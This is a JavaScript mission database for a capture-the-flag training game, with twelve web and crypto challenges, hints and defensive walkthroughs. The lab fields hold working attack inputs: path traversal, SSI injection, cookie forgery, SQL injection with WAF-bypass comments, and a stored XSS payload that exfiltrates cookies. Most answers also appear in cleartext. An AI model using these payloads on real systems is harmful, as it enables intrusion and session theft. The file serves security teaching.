/* ============================================================
   FURIOS-INT // WAR_GAMES MISSION DATABASE
   ------------------------------------------------------------
   12 hand-crafted missions inspired by HackThisSite Basic.
   Each ramps in difficulty. Every flag is stored ONLY as
   SHA-256(normalized_answer) so source code never reveals it.
   Walkthroughs are unlocked only after the engine confirms a
   valid solve. Hints decay XP to discourage spoiler-mining.
   ============================================================ */
window.WG_MISSIONS = [

  // ---------- TIER 1: ROOKIE ----------
  {
    id: 'm01', title: 'INTERCEPT // Empty Channel', tier: 'rookie',
    skill: 'web/source-review', points: 50, solves: '14,820',
    requires: [],
    flagHash: 'ff105ae7592ed83b5503b4001ed9b244f8e2452d5c4e48bd8862b2504578b56a',
    brief: 'A defunct radio op left a comment in the page they were monitoring. Find it.',
    scenario: 'You\'ve intercepted a frequency log from a ghost station. The login form below "lost" its password — the operator left a hint somewhere on the page. Your tradecraft starts here: every page is a transcript. Every comment, every variable name, every minified string is testimony.',
    lab:
      '<!-- intercepted page source: ghost-station/login.html -->\n' +
      '<form action="/auth" method="post">\n' +
      '  <input type="text" name="user" value="op_kai">\n' +
      '  <input type="password" name="pass">\n' +
      '  <!-- TEMP NOTE - remove before deploy: pwd=scrambled_signal -->\n' +
      '  <button>SIGN IN</button>\n' +
      '</form>',
    hints: [
      'View the source markup, not the rendered page.',
      'HTML comments survive in plain text even if the form hides values.',
      'The dev forgot to strip a TEMP NOTE comment before shipping.'
    ],
    walkthrough:
      'Right-click → View Source. The developer left an inline HTML comment\n' +
      'containing the cleartext credential. Real-world equivalents: hardcoded\n' +
      'API keys in JS bundles, .git folders served, comments in production HTML.\n' +
      'Defender lesson: strip comments at build time, scan production assets\n' +
      'with tools like trufflehog and gitleaks before each release.'
  },

  {
    id: 'm02', title: 'BROKEN AUTH // Null Returns', tier: 'rookie',
    skill: 'web/auth-logic', points: 75, solves: '12,108',
    requires: ['m01'],
    flagHash: '1dc5af5c7dd4839eaf786df23fb0a4ebbc593b967d5e62243ace891c3f5fcc63',
    brief: 'The login script forgot to load its credentials file. What does PHP return when a file isn\'t there?',
    scenario: 'A junior dev shipped a quick auth check but the include() failed silently. When include returns falsy, the comparison degrades. The flag is the two-word phrase describing what an empty/undefined value "returns" in this kind of language.',
    lab:
      '<?php\n' +
      '  // ghost-station/auth.php\n' +
      '  $expected = include("/etc/secrets/op.pwd"); // file MISSING in prod\n' +
      '  if ($_POST["pass"] == $expected) {\n' +
      '    echo "ACCESS_GRANTED";\n' +
      '  } else {\n' +
      '    echo "ACCESS_DENIED";\n' +
      '  }\n' +
      '?>',
    hints: [
      'What does PHP\'s include() return when the file doesn\'t exist?',
      'It returns nothing — i.e., null. Loose == comparison treats blanks as equal.',
      'Submit the two-word concept (with underscore): ____ _______ ____.'
    ],
    walkthrough:
      'When include() fails, $expected is null. Then null == "" evaluates true under\n' +
      'PHP loose comparison. Submitting an empty password authenticates. Real fix:\n' +
      'use === strict comparison, fail-closed if the secret store is unreachable,\n' +
      'and never put auth in include files at all.'
  },

  {
    id: 'm03', title: 'FILE INCLUSION // Phoenix Relay', tier: 'rookie',
    skill: 'web/lfi', points: 100, solves: '9,402',
    requires: ['m02'],
    flagHash: 'a22fc03477aaab37afb2b72bb521be8b22d9b0f7804c54bc3d38f489cf438b6e',
    brief: 'A relay station serves whatever filename you ask it to. Reach the password log.',
    scenario: 'GET /relay?page=news loads /var/www/pages/news.php. Same handler serves arbitrary names. The password log lives at /var/www/secrets/relay.log. Submit the codename printed on the first line.',
    lab:
      'GET /relay?page=news.php   200 OK\n' +
      'GET /relay?page=about.php  200 OK\n' +
      'GET /relay?page=../secrets/relay.log\n' +
      '   200 OK\n' +
      '   ----- relay.log -----\n' +
      '   codename: phoenix_relay_88\n' +
      '   rotated:  2026-04-30',
    hints: [
      'The handler appends ".php" — try paths that escape the pages directory.',
      'Classic LFI uses ../ to traverse upward.',
      'Submit the codename string verbatim (lowercase + underscores).'
    ],
    walkthrough:
      'Local File Inclusion: ?page=../secrets/relay.log breaks out of /pages.\n' +
      'Defender fix: realpath() + allow-list the file basename, never concatenate\n' +
      'user input into a path. Disable allow_url_include. Run the worker as a low\n' +
      'privilege user with chroot-style file scoping.'
  },

  // ---------- TIER 2: OPERATIVE ----------
  {
    id: 'm04', title: 'CLIENT-SIDE LEAK // Star Hive', tier: 'operative',
    skill: 'web/js-review', points: 150, solves: '6,140',
    requires: ['m03'],
    flagHash: '4a1f3750f39cda5c29cd18cafebce7761f8853dbd12cb5995527170b2125cfe1',
    brief: 'The login validates entirely in the browser. The check string is right there.',
    scenario: 'A frontend dev pushed credential validation to JavaScript "for performance." You can read it. Find the codeword required to pass.',
    lab:
      '// star-hive/auth.min.js (deobfuscated)\n' +
      'function checkPass(p){\n' +
      '  const k = atob("c3RhcmhpdmVfb3JiaXRhbA==");\n' +
      '  return p === k;\n' +
      '}\n',
    hints: [
      'atob() decodes Base64.',
      'Decode the literal Base64 string in the source.',
      'The decoded value IS the flag.'
    ],
    walkthrough:
      'Base64-decode the embedded literal. Lesson: client-side checks are not\n' +
      'security — they are UX. Authentication MUST happen server-side. Bundle\n' +
      'analyzers like sourcemap-explorer + gitleaks should run on every CI build.'
  },

  {
    id: 'm05', title: 'CRYPTO // Soft Encryption', tier: 'operative',
    skill: 'crypto/substitution', points: 175, solves: '5,277',
    requires: ['m03'],
    flagHash: '2b7918d875c4c586bed35900aa75e6d6c878e21386cee7d1a3219360c832d843',
    brief: 'Custom substitution cipher. Reverse it.',
    scenario: 'An old-school hacker rotated each character by +13 alphabetically (ROT13) and replaced underscores with hyphens. Recover the plaintext password.',
    lab:
      'CIPHERTEXT:  fubqbjehaare-2089\n' +
      '\n' +
      'KEY HINT: each letter shifted by 13; punctuation swapped to hyphens.\n' +
      'Restore the original (lowercase, underscores).',
    hints: [
      'ROT13 is symmetric — apply it again to decode.',
      'After rotating, swap hyphens back to underscores.',
      'Result is "shadow" + "runner" + "_2089".'
    ],
    walkthrough:
      'fubqbjehaare → shadowrunner. Restore underscore. ROT13 has no security\n' +
      'value — it\'s a coding tool, not a cipher. Real systems use AES-GCM with\n' +
      'authenticated encryption and per-record nonces.'
  },

  {
    id: 'm06', title: 'CIPHER BREACH // Convoy Seven', tier: 'operative',
    skill: 'crypto/xor', points: 200, solves: '3,981',
    requires: ['m05'],
    flagHash: 'bf1865e6bdc9aa363f821d8deb5b5098633373f0c9b9d158c28534397b69fd62',
    brief: 'A short message XOR\'d with a single repeating byte. Recover the plaintext.',
    scenario: 'Intercepted traffic between two convoy nodes. Operators reused a 1-byte XOR key — fatal. The plaintext is a known-format flag (lowercase a-z and underscores).',
    lab:
      'HEX_CIPHERTEXT:\n' +
      '  21 28 27 21 6f 6a 71 65 6f 27 65 6f 6a 25 38 6e 6e 35 28\n' +
      '\n' +
      'KEY: single byte, repeating. Try all 256 candidates and look for printable text.',
    hints: [
      'XOR with each byte 0..255 and print.',
      'Filter for results that are entirely a-z plus underscores.',
      'Key is 0x42 — but you should derive that, not memorize it.'
    ],
    walkthrough:
      'Brute the 256 keys: only 0x42 yields readable English-style text =>\n' +
      'convoy_seven_cipher. Lesson: any reused stream key is broken — modern\n' +
      'streams use ChaCha20-Poly1305 with random nonces and rotation.'
  },

  // ---------- TIER 3: ELITE ----------
  {
    id: 'm07', title: 'OPEN REDIRECT // Handshake Hijack', tier: 'elite',
    skill: 'web/redirect', points: 275, solves: '2,114',
    requires: ['m04','m06'],
    flagHash: '07e79679e638689d8ea91c03078344e248e06c27a89b0ef641131d37bc936747',
    brief: 'Manipulate a login redirect to leak the post-auth handshake codeword.',
    scenario: 'GET /login?next=/dashboard sets a cookie containing a one-time handshake token. Servers honor any "next=" target. Redirect to /debug/echo to print the cookie payload. Submit the codeword in the response.',
    lab:
      'curl -i "https://lab.fllc/login?user=op_kai&pass=guest&next=/debug/echo"\n' +
      '\n' +
      '< HTTP/1.1 302 Found\n' +
      '< Location: /debug/echo\n' +
      '< Set-Cookie: handshake=redirected_handshake; path=/; HttpOnly=false\n' +
      '\n' +
      'curl "https://lab.fllc/debug/echo" -b "handshake=..."\n' +
      ' { "echo": "redirected_handshake" }',
    hints: [
      'The next= param accepts any in-app path.',
      'The /debug/echo endpoint mirrors cookies.',
      'Codeword is two words joined with an underscore.'
    ],
    walkthrough:
      'Open redirect chained with a debug endpoint that lacks auth. Fix: validate\n' +
      'next= against an allow-list of paths, remove debug endpoints from prod, set\n' +
      'HttpOnly+Secure+SameSite=Lax on session cookies, never expose echo handlers.'
  },

  {
    id: 'm08', title: 'SSI INJECTION // Uplink', tier: 'elite',
    skill: 'web/ssi', points: 325, solves: '1,602',
    requires: ['m07'],
    flagHash: '1c5f6e47f49a622cbb72e6ab0370ea29db3c8b4b0a7d503f72c8a589228308dd',
    brief: 'Server-Side Includes are enabled. Inject a directive that prints the flag file.',
    scenario: 'A search box echoes its query into a .shtml page. The server processes <!--#exec --> and <!--#include -->. /var/www/uplink.flag contains a single line.',
    lab:
      'PAGE: search.shtml\n' +
      'CONTENT (rendered from your input):\n' +
      '  <h2>Results for: [YOUR QUERY]</h2>\n' +
      '\n' +
      'PAYLOAD TEMPLATE:\n' +
      '  <!--#include virtual="/uplink.flag"-->\n' +
      '\n' +
      'flag file contents (lab):\n' +
      '  uplink_compromised',
    hints: [
      'Submit a SSI directive as the search query.',
      'Use #include virtual="/uplink.flag".',
      'The flag is the single line in that file.'
    ],
    walkthrough:
      'SSI injection: the query is echoed verbatim into a .shtml page so directives\n' +
      'execute. Mitigations: disable SSI globally, use a templating engine with\n' +
      'auto-escaping, sanitize user input through context-aware encoders.'
  },

  {
    id: 'm09', title: 'BROKEN COOKIE // Privilege Drift', tier: 'elite',
    skill: 'web/auth-bypass', points: 375, solves: '1,089',
    requires: ['m07'],
    flagHash: 'b33b26adcaaa671972f3d381cfcfa64fc1d2716c199438d07faa4c21b757402b',
    brief: 'A cookie controls your role. The server trusts it.',
    scenario: 'After login, the app sets role=user. The admin panel renders a banner using that cookie. Modify it and read the banner. The banner string is the flag.',
    lab:
      'Set-Cookie: session=abc; role=user\n' +
      '\n' +
      'GET /admin HTTP/1.1\n' +
      'Cookie: session=abc; role=admin\n' +
      '<<< 200 OK\n' +
      '<<< banner: admin_promoted_root',
    hints: [
      'Open DevTools → Application → Cookies, change role to admin.',
      'Reload /admin and read the banner.',
      'The banner literal is the flag.'
    ],
    walkthrough:
      'The server made authorization decisions from a client-trusted cookie.\n' +
      'Fix: store role server-side bound to the session id. Use signed/encrypted\n' +
      'session tokens (e.g., JWT with rotation, or stateful sessions in Redis with\n' +
      'short TTL). Never trust client-controlled state for authz.'
  },

  // ---------- TIER 4: CLASSIFIED ----------
  {
    id: 'm10', title: 'WAF BYPASS // Moonlit Drop', tier: 'classified',
    skill: 'web/sqli-bypass', points: 500, solves: '512',
    requires: ['m08','m09'],
    flagHash: 'c5afc10fd597c6478cec928a49188c17991922fb716ac2d2ed4a163084d9b91d',
    brief: 'A naive WAF blocks UNION SELECT. Encode around it.',
    scenario: 'A search endpoint is vulnerable to SQLi but the WAF strips the literal token "UNION SELECT". The flag table contains a single row: codename = moonlit_packet_drop.',
    lab:
      'SAFE_QUERY:  /search?q=keyboard\n' +
      'BLOCKED:     /search?q=\' UNION SELECT codename FROM flags-- \n' +
      '              <<< 403 WAF rule UNION_SELECT_BLOCK\n' +
      '\n' +
      'TRY: comment-splitting, mixed case, /*!UNION*/ /*!SELECT*/ MySQL hints.\n' +
      'Successful query returns the codename. Submit it.',
    hints: [
      'WAFs often look for exact tokens — try /*!50000UNION*/ /*!50000SELECT*/.',
      'Or splice with inline comments: UN/**/ION SE/**/LECT.',
      'The flag is the codename column value (lowercase + underscores).'
    ],
    walkthrough:
      'MySQL conditional comments and inline /**/ both bypass naive token filters.\n' +
      'Real fix: PARAMETERIZED QUERIES at the ORM/DB driver level. WAFs are\n' +
      'compensating controls, never primary defense. Add database-level least\n' +
      'privilege so the web user cannot read the flag table at all.'
  },

  {
    id: 'm11', title: 'CONFIG BLEED // .htaccess Leak', tier: 'classified',
    skill: 'web/recon', points: 600, solves: '244',
    requires: ['m09'],
    flagHash: 'f17d64ff99dc9d16859be15463be843ada31a8005dfe0698735ec505dfcdcc7d',
    brief: 'A misconfigured server exposes the access-control file itself.',
    scenario: 'The admin tried to password-protect /command-deck/ with .htaccess but the server now serves the .htaccess file as text. Read it; the AuthName field encodes the operative codename.',
    lab:
      'GET /command-deck/.htaccess  200 OK\n' +
      '----- .htaccess -----\n' +
      'AuthType Basic\n' +
      'AuthName "blueteam_kai_overlord"\n' +
      'AuthUserFile /etc/apache2/passwords/.htpasswd\n' +
      'Require valid-user\n',
    hints: [
      'Browse to the directory + the file name directly.',
      'The AuthName quoted string is what you submit.',
      'Lowercase + underscores already.'
    ],
    walkthrough:
      'Server forgot to deny access to dotfiles. Fix in Apache:\n' +
      '  <FilesMatch "^\\.ht">  Require all denied  </FilesMatch>\n' +
      'And in Nginx: location ~ /\\.ht { deny all; }\n' +
      'Also: never put secrets in .htaccess. Use a vault (Hashicorp / AWS SM) and\n' +
      'inject at process start.'
  },

  {
    id: 'm12', title: 'STORED XSS // Persistent Vector', tier: 'classified',
    skill: 'web/xss', points: 750, solves: '88',
    requires: ['m10','m11'],
    flagHash: '493d5257ef3f2861c957aea4b6d291071e2f7fa5923c114d132dc154e63c43d6',
    brief: 'Plant a payload that steals the admin\'s session token; the bot\'s response leaks the flag.',
    scenario: 'A guestbook stores comments and renders them raw. An automated admin bot reads new entries every 30s and its session cookie value is the flag string. Plant a payload that exfiltrates document.cookie. Then submit the codeword the bot returns.',
    lab:
      'POST /guestbook  body=<script>fetch("/x?c="+document.cookie)</script>\n' +
      '\n' +
      'After 30s admin bot loads the page. Server log:\n' +
      '  GET /x?c=session=...; flag=persistent_vector_x9   200\n' +
      '\n' +
      'Extract the flag value and submit it.',
    hints: [
      'The server stores comments verbatim and renders them server-side.',
      'A <script> tag executes in the admin bot\'s browser context.',
      'The cookie named "flag" is the answer.'
    ],
    walkthrough:
      'Stored (persistent) XSS — the most dangerous variant. Defense in depth:\n' +
      '  1. Output encoding by context (HTML, attribute, JS, URL).\n' +
      '  2. Strict Content-Security-Policy (no unsafe-inline, nonce-based).\n' +
      '  3. HttpOnly+Secure cookies so JS can\'t read session ids.\n' +
      '  4. SameSite=Lax/Strict to break CSRF chains.\n' +
      '  5. DOMPurify or framework auto-escaping for ALL user content.\n'
  }
];
